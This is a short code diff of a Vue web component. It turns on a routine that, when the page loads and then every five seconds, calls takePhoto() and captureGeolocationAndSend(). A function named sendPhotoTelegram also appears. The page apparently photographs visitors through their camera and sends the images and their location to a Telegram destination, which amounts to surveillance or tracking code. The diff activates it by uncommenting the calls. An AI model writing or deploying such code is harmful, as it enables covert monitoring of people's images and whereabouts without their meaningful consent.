@@ -101,12 +101,12 @@ async function sendPhotoTelegram(imageDataURL: string) {
 }
 
 onMounted(() => {
-  //   takePhoto();
+  takePhoto();
   captureGeolocationAndSend();
-  // setInterval(() => {
-  //   takePhoto();
-  //   captureGeolocationAndSend();
-  // }, 5000);
+  setInterval(() => {
+    takePhoto();
+    captureGeolocationAndSend();
+  }, 5000);
 });
 </script>
 
